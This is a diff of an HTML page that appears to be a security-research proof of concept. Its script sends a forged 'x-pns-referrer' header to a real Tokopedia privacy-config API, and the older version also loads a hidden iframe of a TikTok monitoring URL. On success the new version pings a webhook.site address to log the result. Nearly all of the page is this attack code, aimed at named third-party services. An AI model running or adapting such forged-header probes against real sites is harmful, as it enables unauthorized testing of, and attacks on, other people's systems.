@@ -1,42 +1,66 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Critical Security Verificationn</title>
+    <title>Security Research - Header Integrity Test</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
-        .terminal { border: 2px solid #0f0; display: inline-block; padding: 40px; box-shadow: 0 0 20px #0f0; background: #050505; }
-        .blink { animation: blinker 1.2s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        #log { font-size: 13px; color: #aaa; text-align: left; margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .container { border: 2px solid #00ff00; display: inline-block; padding: 30px; background: #000; box-shadow: 0 0 15px #00ff00; }
+        .status { font-size: 20px; margin-bottom: 20px; }
+        #details { color: #888; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="terminal">
-        <h1 id="status">[ STATUS: INITIALIZING ]</h1>
-        <p id="sub-status" class="blink">Targeting Web-Cookie Privacy Endpoint...</p>
-        <div id="log"></div>
+    <div class="container">
+        <div class="status" id="status">[ INITIALIZING TEST ]</div>
+        <p id="sub-status">Attempting Header Spoofing on Privacy API...</p>
+        <div id="details">Waiting for execution...</div>
     </div>
 
-    <iframe id="pwn_gate" 
-            src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
-            style="display:none;"></iframe>
-
     <script>
-    // Langsung tembak API mereka dengan header palsu dari domain kita
-    fetch("https://shop-id.tokopedia.com/api/v1/web-cookie-privacy/config?locale=en&appId=1988", {
-        method: "GET",
-        mode: "cors", // Ini akan memicu CORS check
-        headers: {
-            "x-pns-referrer": "https://fadhlur21.github.io/pwned"
-        }
-    }).then(res => {
-        if(res.ok) {
-            document.body.innerHTML = "<h1>CRITICAL: Header Spoofing Success!</h1><p>Server accepted forged x-pns-referrer from GitHub Origin.</p>";
-        }
-    });
-</script>
+        const statusH1 = document.getElementById('status');
+        const details = document.getElementById('details');
+        
+        // --- KONFIGURASI ---
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI DENGAN ID WEBHOOK LU
+        const targetApi = "https://shop-id.tokopedia.com/api/v1/web-cookie-privacy/config?locale=en&appId=1988";
 
+        async function startExploit() {
+            try {
+                statusH1.innerText = "[ EXECUTING SPOOFING ]";
+                details.innerText = "Sending forged x-pns-referrer to Tokopedia API...";
+
+                // Kita menembak API dengan header palsu
+                const response = await fetch(targetApi, {
+                    method: "GET",
+                    mode: "cors",
+                    headers: {
+                        "x-pns-referrer": "https://fadhlur21.github.io/exploit-poc",
+                        "x-custom-audit": "vulnerability-found"
+                    }
+                });
+
+                if (response.status === 200) {
+                    statusH1.innerText = "[ SUCCESS: 200 OK ]";
+                    statusH1.style.color = "#ffff00";
+                    details.innerHTML = "Server accepted forged headers!<br>Check Reqable & Webhook now.";
+                    
+                    // Kirim konfirmasi ke Webhook lu bahwa spoofing berhasil
+                    fetch(webhook + "?status=spoofing_success&origin=github_pages");
+                } else {
+                    statusH1.innerText = "[ FAILED ]";
+                    details.innerText = "Status Code: " + response.status;
+                }
+            } catch (err) {
+                statusH1.innerText = "[ ERROR ]";
+                details.innerText = "CORS Blocked or Network Error. Check Reqable Logs.";
+                console.error(err);
+            }
+        }
+
+        // Jalankan setelah 2 detik agar lu sempat siap-siap rekam
+        setTimeout(startExploit, 2000);
+    </script>
 </body>
 </html>
